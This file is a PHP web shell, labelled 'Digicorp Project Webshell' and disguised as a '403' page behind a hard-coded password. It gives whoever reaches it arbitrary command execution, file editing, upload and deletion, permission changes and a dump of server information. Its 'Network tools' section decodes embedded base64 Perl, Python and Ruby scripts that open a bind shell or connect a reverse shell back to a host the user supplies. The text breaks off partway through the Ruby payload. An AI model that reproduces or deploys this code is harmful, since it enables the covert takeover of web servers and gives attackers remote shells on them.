<?php
$password='24434';//passwordmu
error_reporting(0);
$xyn='psatir';
if(isset($_POST['pass'])) {if($_POST['pass']==$password) {setcookie($xyn, $_POST['pass'], time()+3600);} let_him_in();}
if(!empty($password) && !isset($_COOKIE[$xyn]) or ($_COOKIE[$xyn]!=$password)) {initiate(); die();}
$me=basename(__FILE__);$server_soft=$_SERVER["SERVER_SOFTWARE"];$uname=php_uname();$cur_user=get_current_user().' uid:'.getmyuid().' gid:'.getmygid();$safe_mode=ini_get('safe_mode');$safe_mode=($safe_mode)?('<font color:lime>ON</font>'):('<font color=red>OFF</font>');$cwd=getcwd();$bckC='#000';$txtC='#00ffff';
$start='<html><head><title>403</title><style>::selection {background: blue; color:#fff;} hr { border:0; height:1px; background:#fff;} body {background:'.$bckC.';color:'.$txtC.';font-size:9pt;font-family:monospace;}h1#n{position:fixed;top:10px;left:10px;text-shadow:0px 0px 5px black;color:lime;} h1#nm{text-shadow:0px 0px 5px black;color:#00ffff;}a {color:'.$txtC.';text-decoration:none;font-family:monospace;}a:hover {color:#fff; text-shadow: 0pt 0pt 0.99em #fff, 0pt 0pt 0.99em #fff;}hr {height:1px;border:0;background:'.$txtC.';color:black;}p#bck{position:fixed;top:20px;right:20px;}#menu {position: fixed; bottom:0;width:100%;font-size:10pt;}#menuB {background:'.$bckC.'; padding:5px 20px 5px 20px;border:1px solid #00ffff;}table#moreI{font-size:9pt;background:'.$bckC.';padding:5px;position:fixed;bottom:40px;right:40px;display:none;}p#cp {font-size:9pt;}table#lt {font-size:9pt;}input#lt,input#sv {background:'.$bckC.';border:1px solid '.$txtC.';color:'.$txtC.';text-align:center;}input#ltb {background:rgba(0,0,0,0);color:'.$txtC.';box-shadow:0px 0px 1px '.$txtC.';border:0px solid rgba(0,0,0,0);}table#ft {font-size:9pt;padding:5px;box-shadow:0px 0px 10px black;}td#fh {text-shadow: 0pt 0pt 0.99em #00ffff, 0pt 0pt 0.99em #00ffff; border-bottom:0px solid '.$txtC.';padding-bottom:3px;}tr#fn:hover{background: blue;color:#fff; text-shadow: 0pt 0pt 0.99em #fff, 0pt 0pt 0.99em #fff;}h3 {text-shadow:0px 0px 4px black;font-size:9pt;}textarea#edit {background:'.$bckC.';color:'.$txtC.';box-shadow:0px 0px 10px black;border:none;padding:10px;}</style><script type="text/javascript">function get_inf() {if(document.getElementById(\'moreI\').style.display=="block"){document.getElementById(\'moreI\').style.display="none"}else {document.getElementById(\'moreI\').style.display="block";}} function xyn(id1,id2) {document.getElementById(id1).style.display="block";document.getElementById(id2).style.display="none";}</script></head><body>';
$end='</body></html>';$inf='<p id="inf"> <b><center><h1><a href="?">[ ! ] Digicorp Project Webshell [ ! ]</a></h1></center><br><br>SOFTWARE : </b> '.$server_soft.' [<a href="?x=phpinf&d='.realpath('.').'">PHP INFO</a>] <br>  <b>UNAME : </u></i></b> '.$uname.' <br> <b>USER : </b> '.$cur_user.'  <br> <b>SAFE MODE : </b> '.$safe_mode.' <br> <b>DIRECTORY : </b>'.$cwd.'<br></p><hr>';
print $start;print $menu;print $inf;
$moreI=array('PHP Version' => phpversion(),'Zend Version' => zend_version(),'Magic Quotes' => magic_quotes(),'Curl' => curl(),'Register Globals' => reg_globals(),'OpenBase Dir' => openbase_dir(),'MySQL' => myql(),'Gzip' => gzip(),'MsSQL' => mssql(),'PostgreSQL' => postgresql(),'Oracle' => oracle(),'Total Space' => h_size(disk_total_space('/')) ,'Used Space' => h_size(disk_free_space('/')),'Your IP' => $_SERVER['REMOTE_ADDR'],'Server IP' => $_SERVER['SERVER_ADDR']);print '<table id="moreI">'; foreach($moreI as $n => $v) {print '<td>'.$n.'</td><td> :> </td><td> '.$v.'</td><tr>';} print '<td colspan=3 align="center"><a href="?x=phpinf" target="_blank">PHPInfo</a></td></table>';
if(isset($_GET['d'])) {chdir($_GET['d']);}
if(isset($_REQUEST['x']))
{
	
	switch($_REQUEST['x'])
	{
		case 'c': 
		print '<center>[ <a href="?aksi=jumping&d="'.realpath('.').'">Jumping</a> ] [ <a href="?aksi=encdec&d="'.realpath('.').'">Encode-Decode</a> ] [ <a href="?aksi=bctools&d="'.realpath('.').'">Network tools</a> ] [ <a href="?x=php&d="'.realpath('.').'">PHP-Code</a> ] [ <a href="?x=yamete"><font color=red>Logout</font></a> ] [ <a href="https://t.me/x7htm">Contact</a> ]</center>';
		print '<p align="center" id="cp">'.curpath('').'</p>';		
		if(isset($_POST['edit_form'])){$f=$_GET['f'];$e=fopen($f,'w') or print '<p id="nn">Error Opening File</p>';fwrite($e,$_POST['edit_form']) or print '<p id="nn">Couldn\'t Save File</p>';fclose($e);}print '<center><p>Editing '.$_GET['f'].' ('.perms($_GET['d'] . $_GET['f']).') .</p></br></br><form action="?x=c&d='.realpath('.').'&f='.$_GET['f'].'" method="POST"><textarea cols=90 rows=15 name="edit_form" id="edit">';if(file_exists($_GET['f'])){$c=file($_GET['f']);foreach($c as $l){print htmlspecialchars($l);}}print '</textarea></br></br><input type="submit" value="Save" id="sv"></form></center>';break;
		case 'cmd': 
		print '<center>[ <a href="?aksi=jumping&d="'.realpath('.').'">Jumping</a> ] [ <a href="?aksi=encdec&d="'.realpath('.').'">Encode-Decode</a> ] [ <a href="?aksi=bctools&d="'.realpath('.').'">Network tools</a> ] [ <a href="?x=php&d="'.realpath('.').'">PHP-Code</a> ] [ <a href="?x=yamete"><font color=red>Logout</font></a> ] [ <a href="https://t.me/x7htm">Contact</a> ]</center>';
		print '<p align="center" id="cp">'.curpath('').'</p>';
		print '</br></br><center><h3>Execute Command</h3><form action="?x=cmd&d='.realpath('.').'" method="POST"><input type="text" value="" name="cmd" id="lt">  <input type="submit" value="Go" id="lt"></form></br><textarea cols=90 rows=15 id="edit">';if(isset($_POST['cmd'])) {$cmd=$_POST['cmd']; execute(exec_meth(),$cmd);}print '</textarea></center>';break;
		case 'php':
		print '<center>[ <a href="?aksi=jumping&d="'.realpath('.').'">Jumping</a> ] [ <a href="?aksi=encdec&d="'.realpath('.').'">Encode-Decode</a> ] [ <a href="?aksi=bctools&d="'.realpath('.').'">Network tools</a> ] [ <a href="?x=php&d="'.realpath('.').'">PHP-Code</a> ] [ <a href="?x=yamete"><font color=red>Logout</font></a> ] [ <a href="https://t.me/x7htm">Contact</a> ]</center>';
		print '<p align="center" id="cp">'.curpath('').'</p>';
		print '</br></br><center><h3>PHP Code</h3><form action=?x=php&d="'.realpath('.').'" method="POST"><input type="text" value="" name="pcode" id="lt"> <input type="submit" value="Go" id="lt"></form></br><textarea cols=90 rows=15 id="edit">';print '</textarea></center>';break;
		case 'phpinf':
		print '<center>[ <a href="?aksi=jumping&d="'.realpath('.').'">Jumping</a> ] [ <a href="?aksi=encdec&d="'.realpath('.').'">Encode-Decode</a> ] [ <a href="?aksi=bctools&d="'.realpath('.').'">Network tools</a> ] [ <a href="?x=php&d="'.realpath('.').'">PHP-Code</a> ] [ <a href="?x=yamete"><font color=red>Logout</font></a> ] [ <a href="https://t.me/x7htm">Contact</a> ]</center>';
		print '<p align="center" id="cp">'.curpath('').'</p>';
		phpinfo();exit;
		case 'yamete': setcookie($xyn,'',time()-3600);let_him_in();break;
	}
}
else
{
	if(isset($_GET['d'])) {chdir($_GET['d']);}
	if($_GET['aksi'] == 'autoedt'){
	print '<center>[ <a href="?aksi=autoedt&d="'.realpath('.').'">Auto edit user</a> ] [ <a href="?aksi=jumping&d="'.realpath('.').'">Jumping</a> ] [ <a href="?aksi=encdec&d="'.realpath('.').'">Encode-Decode</a> ] [ <a href="?aksi=bctools&d="'.realpath('.').'">Network tools</a> ] [ <a href="?x=php&d="'.realpath('.').'">PHP-Code</a> ] [ <a href="?x=yamete"><font color=red>Logout</font></a> ] [ <a href="https://t.me/x7htm">Contact</a> ]</center>';
	print '<p align="center" id="cp">'.curpath('').'</p>';
		autoEdit($d,$f);}
	if($_GET['aksi'] == 'jumping'){
	print '<center>[ <a href="?aksi=autoedt&d="'.realpath('.').'">Auto edit user</a> ] [ <a href="?aksi=jumping&d="'.realpath('.').'">Jumping</a> ] [ <a href="?aksi=encdec&d="'.realpath('.').'">Encode-Decode</a> ] [ <a href="?aksi=bctools&d="'.realpath('.').'">Network tools</a> ] [ <a href="?x=php&d="'.realpath('.').'">PHP-Code</a> ] [ <a href="?x=yamete"><font color=red>Logout</font></a> ] [ <a href="https://t.me/x7htm">Contact</a> ]</center>';
	print '<p align="center" id="cp">'.curpath('').'</p>';
		aksiJump($d,$f,$ip);}
	if($_GET['aksi'] == 'bctools'){
	print '<center>[ <a href="?aksi=autoedt&d="'.realpath('.').'">Auto edit user</a> ] [ <a href="?aksi=jumping&d="'.realpath('.').'">Jumping</a> ] [ <a href="?aksi=encdec&d="'.realpath('.').'">Encode-Decode</a> ] [ <a href="?aksi=bctools&d="'.realpath('.').'">Network tools</a> ] [ <a href="?x=php&d="'.realpath('.').'">PHP-Code</a> ] [ <a href="?x=yamete"><font color=red>Logout</font></a> ] [ <a href="https://t.me/x7htm">Contact</a> ]</center>';
	print '<p align="center" id="cp">'.curpath('').'</p>';
		bcTool($d,$f);}
	if($_GET['aksi'] == 'encdec'){
	print '<center>[ <a href="?aksi=autoedt&d="'.realpath('.').'">Auto edit user</a> ] [ <a href="?aksi=jumping&d="'.realpath('.').'">Jumping</a> ] [ <a href="?aksi=encdec&d="'.realpath('.').'">Encode-Decode</a> ] [ <a href="?aksi=bctools&d="'.realpath('.').'">Network tools</a> ] [ <a href="?x=php&d="'.realpath('.').'">PHP-Code</a> ] [ <a href="?x=yamete"><font color=red>Logout</font></a> ] [ <a href="https://t.me/x7htm">Contact</a> ]</center>';
	print '<p align="center" id="cp">'.curpath('').'</p>';
		encdec();}
	if(isset($_GET['ndir'])) {$d=$_GET['d'];$n=$_GET['ndir'];mkdir($d .DIRECTORY_SEPARATOR. $n);}
	if(isset($_POST['new'])) {$n=$_POST['new'];$o=$_POST['old'];$d=$_POST['d'];rename($d.DIRECTORY_SEPARATOR.$o,$d.DIRECTORY_SEPARATOR.$n);
}
	if(isset($_GET['deld'])) {$d=$_GET['deld']; rmdir($d);}
	if(isset($_GET['delf'])) {$d=$_GET['delf']; unlink($d);}
	if(isset($_GET['ch'])) {$ch=$_GET['ch']; $d=$_GET['df']; chmod($d,$ch);}
	if(isset($_FILES['upfile']['name'])) {$d=realpath('.').DIRECTORY_SEPARATOR.basename($_FILES['upfile']['name']);move_uploaded_file($_FILES['upfile']['tmp_name'],$d);}
	
	
	print '</br>';
	print '<center>[ <a href="?aksi=autoedt&d="'.realpath('.').'">Auto edit user</a> ] [ <a href="?aksi=jumping&d="'.realpath('.').'">Jumping</a> ] [ <a href="?aksi=encdec&d="'.realpath('.').'">Encode-Decode</a> ] [ <a href="?aksi=bctools&d="'.realpath('.').'">Network tools</a> ] [ <a href="?x=php&d="'.realpath('.').'">PHP-Code</a> ] [ <a href="?x=yamete"><font color=red>Logout</font></a> ] [ <a href="https://t.me/x7htm">Contact</a> ]</center>';
	print '<p align="center" id="cp">'.curpath('').'</p>';
	print '</br><hr>';
	$filex=array();
	$dirx=array();
	print '<table width="100%" align="center" id="ft" ><td id="fh" align="center"><b>Name</b></td><td id="fh" align="center"><b>Permission</b></td><td id="fh" align="center"><b>Owner/Group</b></td><td id="fh" align="center"><b>Options</b></td><tr id="fn">';
	if($handle=opendir('.')) {while(false !== ($file=readdir($handle))) {if(is_dir($file)) {$dirx[] .= $file;} else {$filex[] .= $file;}}asort($filex);asort($dirx);$i=0;
	foreach($dirx as $file) {if(function_exists('posix_getpwuid') && function_exists('posix_getgrgid')) {$own=posix_getpwuid(fileowner($file)); $grp=posix_getgrgid(filegroup($file));} else {$own['name']='???'; $grp['name']='???';}  print '<td id="fc"><span id="n'.$file.'"><a href="?d='.realpath($file).'">'.$file.'</a></span><span id="r'.$file.'" style="display:none;"><form action="?d='.realpath('.').'" method="POST"><input type="hidden" value="'.realpath('.').'" name="d"> <input type="text" value="'.$file.'" id="lt" name="new"><input type="hidden" value="'.$file.'" name="old"> <input type="submit" id="lt" value="Rename"> <input type="button" id="lt" value="Cancel" onClick="xyn(\'n'.$file.'\',\'r'.$file.'\');"></form></span><span id="d'.$file.'" style="display:none;"><form action="?d='.realpath('.').'" method="GET">Yakin Ngab?<input type="hidden" value="'.realpath($file).'" name="deld"> <input type="submit" value="Iyah" id="lt"> <input type="button" id="lt" value="No" onClick="xyn(\'n'.$file.'\',\'d'.$file.'\')"></form></span></td><td id="fc" align="center"><span id="h'.$file.'"><a href="javascript:xyn(\'c'.$file.'\',\'h'.$file.'\');"><font color="'.get_color($file).'">'.perms($file).'</font></a></span><span id="c'.$file.'" style="display:none;"><form action="?d='.realpath('.').'" method="GET"><input type="hidden" value="'.realpath($file).'" name="df"><input type="text" value="'.perms($file).'" id="lt" name="ch"> <input type="submit" id="lt" value="Go"> <input type="button" id="lt" value="Cancel" onClick="xyn(\'h'.$file.'\',\'c'.$file.'\');"></form></span></td><td id="fc" align="center">'.$own['name'].' : '.$grp['name'].'</td>'; if($i==0 or $i==1) {print '<td id="fc"></td><tr id="fn">';} else {print '<td id="fc" align="center"><a href="javascript:xyn(\'r'.$file.'\',\'n'.$file.'\')">Rename</a> | <a href="javascript:xyn(\'d'.$file.'\',\'n'.$file.'\')">Delete</a></td><tr id="fn">';} $i++;}
	foreach($filex as $file) {if(function_exists('posix_getpwuid') && function_exists('posix_getgrgid')) {$own=posix_getpwuid(fileowner($file)); $grp=posix_getgrgid(filegroup($file));} else {$own['name']='???'; $grp['name']='???';} print '<td id="fc"><span id="n'.$file.'"><a href="?x=c&d='.realpath('.').'&f='.$file.'">'.$file.'</a></span><span id="r'.$file.'" style="display:none;"><form action="?d='.realpath('.').'" method="POST"><input type="hidden" value="'.realpath('.').'" name="d"> <input type="text" id="lt" value="'.$file.'" name="new"><input type="hidden" value="'.$file.'" name="old"><input type="submit" id="lt" value="Rename"><input type="button" id="lt" value="Cancel" onClick="xyn(\'n'.$file.'\',\'r'.$file.'\');"></form></span><span id="d'.$file.'" style="display:none;"><form action="?d='.realpath('.').'" method="GET">Yakin deck?<input type="hidden" value="'.realpath($file).'" name="delf"> <input type="submit" value="Iyah" id="lt"> <input type="button" id="lt" value="No" onClick="xyn(\'n'.$file.'\',\'d'.$file.'\')"></form></span></td><td id="fc" align="center"><span id="h'.$file.'"><a href="javascript:xyn(\'c'.$file.'\',\'h'.$file.'\');"><font color="'.get_color($file).'">'.perms($file).'</font></a></span><span id="c'.$file.'" style="display:none;"><form action="?d='.realpath('.').'" method="GET"><input type="hidden" value="'.realpath($file).'" name="df"><input type="text" value="'.perms($file).'" id="lt" name="ch"> <input type="submit" id="lt" value="Go"> <input type="button" id="lt" value="Cancel" onClick="xyn(\'h'.$file.'\',\'c'.$file.'\');"></form></span></td><td id="fc" align="center">'.$own['name'].' : '.$grp['name'].'</td><td id="fc" align="center"><a href="javascript:xyn(\'r'.$file.'\',\'n'.$file.'\')">Rename</a> | <a href="javascript:xyn(\'d'.$file.'\',\'n'.$file.'\');">Delete</a></td><tr id="fn">';}}
print '</table><br><br>';
print '<table width=100% align="center" id="lt"cellpadding="0"><td align="center"><form action="?d='.realpath('.').'" method="GET">Create Dir: <input type="hidden" name="d" value="'.realpath('.').'" id="lt"><input type="text" value="" name="ndir" id="lt"> <br><br><input type="submit" value=">>" id="lt"></form></td><td align="center"><form action="?d="'.realpath('.').'" method="GET">Create File: <input type="hidden" value="'.realpath('.').'" name="d" id="lt"><input type="hidden" value="c" name="x"><input type="text" value="" name="f" id="lt"> <br><br><input type="submit" value=">>" id="lt"></form></td><td align="center"><form action="?x=cmd&d='.realpath('.').'" method="POST">Command: <input type="text" value="" name="cmd" id="lt"> <br><br><input type="submit" value=">>" id="lt"></form></td><td align="center"><form action="?d='.realpath('.').'" method="POST" enctype="multipart/form-data">Upload: <input type="hidden" value="100000000" name="MAX_FILE_SIZE"><input type="file" name="upfile" id="ltb"> <br><br><input type="submit" value=">>" id="lt"></form></td></table><br><br>';
}
function openbase_dir(){$x=ini_get('open_basedir');if(!$x) {$o='<font color=red>OFF</font>';}else {$o='<font color=lime>ON</font>';}return($o);}
function magic_quotes(){$x=get_magic_quotes_gpc();if(empty($x)) {$m='<font color=red>OFF</font>';}else {$m='<font color=lime>ON</font>';}return($m);}
function curl(){if(extension_loaded('curl')) {$c='<font color=>ON</font>';}else {$c='<font color=red>OFF</font>';}return($c);}
function reg_globals(){if(ini_get('reqister_globals')) {$r='<font color=lime>ON</font>';}else {$r='<font color=red>OFF</font>';}return($r);}
function oracle(){if(function_exists('ocilogon')) {$o='<font color=lime>ON</font>';}else {$o='<font color=red>OFF</font>';}return($o);}
function postgresql(){if(function_exists('pg_connect')) {$p='<font color=lime>ON</font>';}else {$p='<font color=red>OFF</font>';}return($p);}
function myql(){if(function_exists('mysql_connect')) {$m='<font color=lime>ON</font>';}else {$m='<font color=red>OFF</font>';}return($m);}
function mssql(){if(function_exists('mssql_connect')) {$m='<font color=lime>ON</font>';}else {$m='<font color=red>OFF</font>';}return($m);}
function gzip(){if(function_exists('gzencode')) {$m='<font color=lime>ON</font>';}else {$m='<font color=red>OFF</font>';}return($m);}
function h_size($s){if($s>=1073741824) {$s=round($s/1073741824*100)/100 .'GB';}elseif($s>=1048576) {$s=round($s/1048576*100)/100 .'MB';}elseif($s>=1024) {$s=round($s/1024*100)/100 .'KB';}else {$s=$s.'B';}return($s);}
function curpath($d){if($d=='') {$d=getcwd();}$p='';$n='';$dx=explode(DIRECTORY_SEPARATOR,$d);for($i=0;$i < count($dx);$i++) {$g=$dx[$i];$p.=$dx[$i] . DIRECTORY_SEPARATOR; $n .='<a href="?d='.$p.'">'.$g.'</a>'.DIRECTORY_SEPARATOR;}return($n);}
function get_color($f){if(is_writable($f)) {$c='lime';}if(!is_writable($f) && is_readable($f)) {$c=''.$txtC.'';}if(!is_writable($f) && !is_readable($f)) {$c='#00ffff';}return($c);}
function perms($f) {if(file_exists($f)) {return substr(sprintf('%o',fileperms($f)), -4);} else {return '???';}}
function exec_meth() {if(function_exists('passthru')) {$m='passthru';} if(function_exists('exec')) {$m='exec';} if(function_exists('shell_exec')) {$m='shell_exec';} if(function_exists('system')) {$m='system';} if(!isset($m)) {$m='Disabled';} return($m);}
function execute($m,$c) {if($m=='passthru') {passthru($c);} elseif($m=='system') {system($c);} elseif($m=='shell_exec') {print shell_exec($c);} elseif($m=='exec') {exec($c,$r); foreach($r as $o) {print $o.'</br>';}} else {print 'Wh00pz';}}
function initiate(){print '<table width=100% height=100% align=center style="background-attachment:fixed; background-size:cover; background:#fff;color:black;"><td valign="middle"><center><form action="'.basename(__FILE__).'" method="POST">Login <input type="password" maxlength="10" name="pass" style="background:#fff;color:black;border:1px solid black;text-align:center;"> <input type="submit" value=">>" style="background:#fff;color:black;border:1px solid black;"></form></center></td></table>';}
function let_him_in() { header("Location: ".basename(__FILE__)); }
function bcTool($dir,$file){
	echo "	<center><h2 class='text-center mb-4'>Network Tools</h2><h3><form method='post'>Bind port to /bin/sh [Perl]<br/><label>Port :</label><input type='text' name='port' class='form-control' id='lt' value='6969'><input type='submit' name='bpl' class='btn btn-danger form-control' id='lt' value='Reverse'><br><br /><br /><h3>Back-Connect</h3><label>Server: </label><input type='text' name='server' id='lt' class='form-control mb-3' placeholder='". $_SERVER['REMOTE_ADDR'] ."'><label>   Port: </label><input type='text' name='port' id='lt' class='form-control' placeholder='443'><select class='form-control' id='lt' name='backconnect'><option value='perl'>Perl</option><option value='php'>PHP</option><option value='python'>Python</option><option value='ruby'>Ruby</option></select><input type='submit' id='lt' class='btn btn-danger btn-block' value='Connect'></form>";
	if($_POST['bpl']){
		$bp = base64_decode("IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=");
		$brt = @fopen('bp.pl','w');
		fwrite($brt,$bp);
		$out = exe("perl bp.pl ".$_POST['port']." 1>/dev/null 2>&1 &");
		sleep(1);
		echo "<pre class='text-light'>$out\n".exe("ps aux | grep bp.pl")."</pre>";
		unlink("bp.pl");
	}
	if($_POST['backconnect'] == 'perl'){
		$bc = base64_decode("IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7");
		$plbc = @fopen('bc.pl','w');
		fwrite($plbc,$bc);
		$out = exe("perl bc.pl ".$_POST['server']." ".$_POST['port']." 1>/dev/null 2>&1 &");
		sleep(1);
		echo "<pre class='text-light'>$out\n".exe("ps aux | grep bc.pl")."</pre>";
		unlink("bc.pl");
	}
	if($_POST['backconnect'] == 'python'){
		$becaa = base64_decode("IyEvdXNyL2Jpbi9weXRob24NCiNVc2FnZTogcHl0aG9uIGZpbGVuYW1lLnB5IEhPU1QgUE9SVA0KaW1wb3J0IHN5cywgc29ja2V0LCBvcywgc3VicHJvY2Vzcw0KaXBsbyA9IHN5cy5hcmd2WzFdDQpwb3J0bG8gPSBpbnQoc3lzLmFyZ3ZbMl0pDQpzb2NrZXQuc2V0ZGVmYXVsdHRpbWVvdXQoNjApDQpkZWYgcHliYWNrY29ubmVjdCgpOg0KICB0cnk6DQogICAgam1iID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pDQogICAgam1iLmNvbm5lY3QoKGlwbG8scG9ydGxvKSkNCiAgICBqbWIuc2VuZCgnJydcblB5dGhvbiBCYWNrQ29ubmVjdCBCeSBNci54QmFyYWt1ZGFcblRoYW5rcyBHb29nbGUgRm9yIFJlZmVyZW5zaVxuXG4nJycpDQogICAgb3MuZHVwMihqbWIuZmlsZW5vKCksMCkNCiAgICBvcy5kdXAyKGptYi5maWxlbm8oKSwxKQ0KICAgIG9zLmR1cDIoam1iLmZpbGVubygpLDIpDQogICAgb3MuZHVwMihqbWIuZmlsZW5vKCksMykNCiAgICBzaGVsbCA9IHN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKQ0KICBleGNlcHQgc29ja2V0LnRpbWVvdXQ6DQogICAgcHJpbnQgIlRpbU91dCINCiAgZXhjZXB0IHNvY2tldC5lcnJvciwgZToNCiAgICBwcmludCAiRXJyb3IiLCBlDQpweWJhY2tjb25uZWN0KCk=");
		$pbcaa = @fopen('bcpyt.py','w');
		fwrite($pbcaa,$becaa);
		$out1 = exe("python bcpyt.py ".$_POST['server']." ".$_POST['port']);
		sleep(1);
		echo "<pre class='text-light'>$out1\n".exe("ps aux | grep bcpyt.py")."</pre>";
		unlink("bcpyt.py");
	}
	if($_POST['backconnect'] == 'ruby'){
		$becaak = base64_decode("IyEvdXNyL2Jpbi9lbnYgcnVieQ0KIyBkZXZpbHpjMGRlLm9yZyAoYykgMjAxMg0KIw0KIyBiaW5kIGFuZCByZXZlcnNlIHNoZWxsDQojIGIzNzRrDQpyZXF1aXJlICdzb2NrZXQnDQpyZXF1aXJlICdwYXRobmFtZScNCg0KZGVmIHVzYWdlDQoJcHJpbnQgImJpbmQgOlxyXG4gIHJ1YnkgIiArIEZpbGUuYmFzZW5hbWUoX19GSUxFX18pICsgIiBbcG9ydF1cclxuIg0KCXByaW50ICJyZXZlcnNlIDpcclxuICBydWJ5ICIgKyBGaWxlLmJhc2VuYW1lKF9fRklMRV9fKSArICIgW3BvcnRdIFtob3N0XVxyXG4iDQplbmQNCg0KZGVmIHN1Y2tzDQoJc3Vja3MgPSBmYWxzZQ0KCWlmIFJVQllfUExBVEZPUk0uZG93bmNhc2UubWF0Y2goJ21zd2lufHdpbnxtaW5ndycpDQoJCXN1Y2tzID0gdHJ1ZQ0KCWVuZA0KCXJldHVybiBzdWNrcw0KZW5kDQoNCmRlZiByZWFscGF0aChzdHIpDQoJcmVhbCA9IHN0cg0KCWlmIEZpbGUuZXhpc3RzPyhzdHIpDQoJCWQgPSBQYXRobmFtZS5uZXcoc3RyKQ0KCQlyZWFsID0gZC5yZWFscGF0aC50b19zDQoJZW5kDQoJaWYgc3Vja3MNCgkJcmVhbCA9IHJlYWwuZ3N1YigvXC8vLCJcXCIpDQoJZW5kDQoJcmV0dXJuIHJlYWwNCmVuZA0KDQppZiBBUkdWLmxlbmd0aCA9PSAxDQoJaWYgQVJHVlswXSA9fiAvXlswLTldezEsNX0kLw0KCQlwb3J0ID0gSW50ZWdlcihBUkdWWzBdKQ0KCWVsc2UNCgkJdXNhZ2UNCgkJcHJpbnQgIlxyXG4qKiogZXJyb3IgOiBQbGVhc2UgaW5wdXQgYSB2YWxpZCBwb3J0XHJcbiINCgkJZXhpdA0KCWVuZA0KCXNlcnZlciA9IFRDUFNlcnZlci5uZXcoIiIsIHBvcnQpDQoJcyA9IHNlcnZlci5hY2NlcHQNCglwb3J0ID0gcy5wZWVyYWRkclsxXQ0KCW5hbWUgPSBzLnBlZXJhZGRyWzJdDQoJcy5wcmludCAiKioqIGNvbm5lY3RlZFxyXG4iDQoJcHV0cyAiKioqIGNvbm5lY3RlZCA6ICN7bmFtZX06I3twb3J0fVxyXG4iDQoJYmVnaW4NCgkJaWYgbm90IHN1Y2tzDQoJCQlmID0gcy50b19pDQoJCQlleGVjIHNwcmludGYoIi9iaW4vc2ggLWkgXDxcJiVkIFw+XCYlZCAyXD5cJiVkIixmLGYsZikNCgkJZWxzZQ0KCQkJcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQoJCQl3aGlsZSBsaW5lID0gcy5nZXRzDQoJCQkJcmFpc2UgZXJyb3JCcm8gaWYgbGluZSA9fiAvXmRpZVxyPyQvDQoJCQkJaWYgbm90IGxpbmUuY2hvbXAgPT0gIiINCgkJCQkJaWYgbGluZSA9fiAvY2QgLiovaQ0KCQkJCQkJbGluZSA9IGxpbmUuZ3N1YigvY2QgL2ksICcnKS5jaG9tcA0KCQkJCQkJaWYgRmlsZS5kaXJlY3Rvcnk/KGxpbmUpDQoJCQkJCQkJbGluZSA9IHJlYWxwYXRoKGxpbmUpDQoJCQkJCQkJRGlyLmNoZGlyKGxpbmUpDQoJCQkJCQllbmQNCgkJCQkJCXMucHJpbnQgIlxyXG4iICsgcmVhbHBhdGgoIi4iKSArICI+Ig0KCQkJCQllbHNpZiBsaW5lID1+IC9cdzouKi9pDQoJCQkJCQlpZiBGaWxlLmRpcmVjdG9yeT8obGluZS5jaG9tcCkNCgkJCQkJCQlEaXIuY2hkaXIobGluZS5jaG9tcCkNCgkJCQkJCWVuZA0KCQkJCQkJcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQoJCQkJCWVsc2UNCgkJCQkJCUlPLnBvcGVuKGxpbmUsInIiKXt8aW98cy5wcmludCBpby5yZWFkICsgIlxyXG4iICsgcmVhbHBhdGgoIi4iKSArICI+In0NCgkJCQkJZW5kDQoJCQkJZW5kDQoJCQllbmQNCgkJZW5kDQoJcmVzY3VlIGVycm9yQnJvDQoJCXB1dHMgIioqKiAje25hbWV9OiN7cG9ydH0gZGlzY29ubmVjdGVkIg0KCWVuc3VyZQ0KCQlzLmNsb3NlDQoJCXMgPSBuaWwNCgllbmQNCmVsc2lmIEFSR1YubGVuZ3RoID09IDINCglpZiBBUkdWWzBdID1+IC9eWzAtOV17MSw1fSQvDQoJCXBvcnQgPSBJbnRlZ2VyKEFSR1ZbMF0pDQoJCWhvc3QgPSBBUkdWWzFdDQoJZWxzaWYgQVJ